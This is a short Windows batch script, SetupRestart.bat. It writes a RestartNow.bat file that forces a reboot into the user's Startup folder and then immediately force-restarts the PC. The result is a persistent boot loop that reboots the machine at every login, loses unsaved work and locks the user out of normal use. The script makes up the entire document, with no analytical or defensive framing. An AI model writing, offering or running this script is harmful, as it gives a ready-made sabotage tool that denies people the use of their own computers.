@echo off
:: ------------------------------
:: SetupRestart.bat
:: This file will:
::   1. Create RestartNow.bat
::   2. Place a shortcut in Startup folder
::   3. Restart PC immediately
:: ------------------------------

:: Define paths
set "StartupFolder=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
set "RestartBat=%StartupFolder%\RestartNow.bat"

:: Create RestartNow.bat that forces restart on boot
echo @echo off > "%RestartBat%"
echo shutdown /r /t 0 /f >> "%RestartBat%"

:: Confirm file creation
echo Restart script created at: %RestartBat%

:: Force restart immediately
shutdown /r /t 0 /f